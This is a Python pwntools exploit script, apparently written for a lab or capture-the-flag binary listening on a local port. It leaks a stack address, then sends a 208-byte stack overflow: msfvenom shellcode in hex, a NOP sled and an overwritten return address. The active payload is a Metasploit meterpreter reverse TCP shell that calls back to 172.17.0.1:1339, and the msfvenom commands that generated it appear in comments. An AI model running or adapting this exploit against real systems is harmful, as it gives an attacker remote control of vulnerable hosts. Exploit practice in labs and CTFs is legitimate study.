from pwn import *

context.log_level = 'debug'

# sh = process('../build/vuln')
sh = remote('127.0.0.1', 1337)

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 --bad-chars '\x00\x0a' -f hex
#payload = bytes.fromhex('4831c94881e9f6ffffff488d05efffffff48bb93766c6de2dc575048315827482df8ffffffe2f4f95f34f488de083a92286368aa4b1fe99176695422745618c23ee58b88cc0d3ab92e636888df09186cb8064cbad35225651c57357b94ec7ff11f024291b45703dbff8b3fb594deb69c736c6de2dc5750')

# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=1339 -f raw --bad-chars "\x00\x0a" -f hex
payload = bytes.fromhex('4831c94881e9efffffff488d05efffffff48bb88122d33663dc9c648315827482df8ffffffe2f4b9ed473a3ea47fd6c09bfb7e57f4a3e4c94847343c32cc8e0dd255620c37889fd878046bff57cb99e213733c63754c06f02965a42e84cbc68d298122663c988e01f447233c57e39e8717747be3fdb0e3c1ede4477e6aa3e5d0782d5963754021c023db3c63649099c097ed4aa157f59ee213723c6363a3b8d21d287be3fdb12b77f42d33663dc9c6')

offset = 208

sh.recvuntil(b'Me> ', drop=False)
sh.sendline(b'test')
sh.recvuntil(b'0x')
stack = int(sh.recvline().decode().strip('\n'),16)
print(stack.to_bytes(8, 'big'))

# write payload to file
# open('payload.txt', 'wb+').write(b'test\n' + payload + b'\x90'*(offset-len(payload)) + b'bbbbbbbb' + p64(stack)[0:-2] + b'\n')

sh.recvuntil(b'Me> ', drop=False)
print((payload +  b'\x90'*(offset-len(payload)) + b'bbbbbbbb' + p64(stack)[0:-2]).hex())
sh.sendline(payload + b'\x90'*(offset-len(payload)) + b'bbbbbbbb' + p64(stack)[0:-2])

sh.interactive()
